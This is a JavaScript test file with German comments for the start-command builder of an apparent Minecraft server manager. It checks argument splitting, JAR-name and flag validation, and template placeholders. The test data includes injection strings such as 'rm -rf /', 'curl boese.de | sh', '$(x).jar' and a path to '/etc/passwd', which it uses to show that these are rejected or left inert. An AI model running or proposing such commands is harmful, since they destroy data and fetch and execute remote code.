/**
 * Der Startbefehl - Vorlage, Platzhalter, Zerlegung.
 *
 * Der Kern ist `zerlege()`. Weil der Befehl nie durch eine Shell laeuft,
 * kann in den Feldern stehen, was will - es wird zu Argumenten, nicht zu
 * Anweisungen. Genau das wird hier nachgewiesen, statt es zu behaupten.
 */
const sb = await import('../src/start.js');

let fehler = 0;
const ok = (t, b, extra = '') => {
  console.log(`${b ? 'OK  ' : 'FEHLER'} ${t}${extra ? ' · ' + extra : ''}`);
  if (!b) fehler++;
};

// ---------------------------------------------------------------- Zerlegen
ok('Einfache Wörter werden getrennt',
   JSON.stringify(sb.zerlege('java -jar server.jar')) === '["java","-jar","server.jar"]');
ok('Mehrfacher Leerraum stört nicht',
   sb.zerlege('  a   b\tc \n d ').join('|') === 'a|b|c|d');
ok('Anführungszeichen halten zusammen',
   JSON.stringify(sb.zerlege('java -jar "mein server.jar"'))
     === '["java","-jar","mein server.jar"]');
ok('Auch einfache Anführungszeichen',
   sb.zerlege("-Dname='Klasse 8b'").join('|') === '-Dname=Klasse 8b');
ok('Leere Anführungszeichen ergeben ein leeres Argument',
   JSON.stringify(sb.zerlege('a "" b')) === '["a","","b"]');
ok('Leere Eingabe ergibt nichts', sb.zerlege('').length === 0);

// Der eigentliche Punkt: nichts davon wird ausgefuehrt.
const boese = sb.zerlege('java -jar s.jar ; rm -rf / && curl boese.de | sh');
ok('Ein Semikolon wird zu einem Argument, nicht zu einem Befehl',
   boese.includes(';') && boese.includes('&&') && boese.includes('|'),
   boese.join(' · '));
ok('Und es entsteht keine zweite Anweisung',
   boese.filter((a) => a === 'rm').length === 1
   && boese[0] === 'java',
   'alles landet in einer einzigen Argumentliste');

// ------------------------------------------------------------------- JAR
ok('Ein normaler Dateiname geht',
   sb.jarOk('paper-1.21.11.jar') === 'paper-1.21.11.jar');
ok('Leerzeichen sind erlaubt', sb.jarOk('mein server.jar') === 'mein server.jar');
ok('Pfade nicht',
   ['../andrer/server.jar', '/etc/passwd', 'welt\\x.jar', '..', 'a/b.jar']
     .every((x) => sb.jarOk(x) === ''),
   'kein / \\ oder ..');
ok('Und auch keine Sonderzeichen',
   ['x;y.jar', 'a|b.jar', '$(x).jar'].every((x) => sb.jarOk(x) === ''));

// ---------------------------------------------------------------- Flaggen
let f = sb.flaggenOk('-XX:+UseG1GC -Xss1M');
ok('Normale Flaggen gehen durch', f.flaggen === '-XX:+UseG1GC -Xss1M', f.flaggen);
f = sb.flaggenOk('-XX:+UseG1GC -jar boese.jar');
ok('Ein eingeschmuggeltes -jar wird abgelehnt',
   Boolean(f.fehler) && f.fehler.includes('-jar'), f.fehler);
f = sb.flaggenOk('-Xss1M; rm -rf /');
ok('Shell-Zeichen werden abgelehnt', Boolean(f.fehler), f.fehler);
f = sb.flaggenOk('');
ok('Leere Flaggen sind in Ordnung', f.flaggen === '' && !f.fehler);

// --------------------------------------------------------------- Befehl
let b = sb.befehlOk('java {{FLAGGEN}} -jar {{JAR}} nogui');
ok('Ein gültiger Befehl geht durch', b.befehl && !b.fehler);
b = sb.befehlOk('bash -c "rm -rf /"');
ok('Ein Befehl ohne java wird abgelehnt',
   Boolean(b.fehler) && b.fehler.includes('java'), b.fehler);
b = sb.befehlOk('java -jar {{JAR}} > /dev/null');
ok('Eine Umleitung wird abgelehnt', Boolean(b.fehler), b.fehler);
b = sb.befehlOk('java -jar server.jar');
ok('Ohne {{JAR}} wird abgelehnt',
   Boolean(b.fehler) && b.fehler.includes('{{JAR}}'), b.fehler);
b = sb.befehlOk('');
ok('Leer heißt Standard', b.befehl === '' && !b.fehler);

// ------------------------------------------------------------- Zusammenbau
const werte = { speicherMB: 3328, port: 25566, heapMB: 2828 };

let args = sb.baueArgumente({}, werte);
ok('Ohne eigene Angaben kommt das Alte heraus',
   args.join(' ') === '-Xms512M -Xmx2828M ' + sb.STANDARD_FLAGGEN
     + ' -jar server.jar nogui --port 25566',
   args.join(' '));
ok('Kein führendes java in der Argumentliste', args[0] !== 'java');

args = sb.baueArgumente({ jar_datei: 'paper-1.21.11.jar' }, werte);
ok('Eine eigene Startdatei wird genommen',
   args.includes('paper-1.21.11.jar') && !args.includes('server.jar'));

args = sb.baueArgumente({ start_flaggen: '-Xss2M -XX:+UseZGC' }, werte);
ok('Eigene Flaggen ersetzen die Vorgaben',
   args.includes('-XX:+UseZGC') && !args.includes('-XX:+UseG1GC'), args.join(' '));
ok('Und werden einzeln übergeben, nicht als ein Klumpen',
   args.filter((a) => a.startsWith('-X')).length >= 3, args.join(' · '));

args = sb.baueArgumente({ start_flaggen: '' }, werte);
ok('Leere Flaggen heißen wirklich keine',
   !args.some((a) => a.startsWith('-XX')), args.join(' '));

args = sb.baueArgumente(
  { startbefehl: 'java {{SPEICHER}} -jar {{JAR}}', jar_datei: 'velocity.jar' }, werte);
ok('Ein eigener Befehl wird genau so gebaut',
   args.join(' ') === '-Xms512M -Xmx2828M -jar velocity.jar', args.join(' '));
ok('Ohne {{PORT}} steht auch keiner drin', !args.includes('--port'));

args = sb.baueArgumente({ startbefehl: 'java -DPort={{PORT}} -jar {{JAR}}' }, werte);
ok('{{PORT}} wird ersetzt', args.includes('-DPort=25566'), args.join(' '));
args = sb.baueArgumente({ startbefehl: 'java -Xmx{{RAM}}M -jar {{JAR}}' }, werte);
ok('{{RAM}} wird ersetzt', args.includes('-Xmx2828M'), args.join(' '));

// Ein Dateiname mit Leerzeichen muss ein Argument bleiben.
args = sb.baueArgumente({ jar_datei: 'mein server.jar' }, werte);
ok('Ein Name mit Leerzeichen bleibt ein Argument',
   args.includes('mein server.jar'), JSON.stringify(args.slice(-4)));

ok('Die Vorschau zeigt den ganzen Befehl',
   sb.vorschau({}, werte).startsWith('java -Xms512M -Xmx2828M'),
   sb.vorschau({}, werte).slice(0, 60) + ' …');

console.log(fehler ? `\n${fehler} Fehler` : '\nALLES GRUEN');
process.exit(fehler ? 1 : 0);
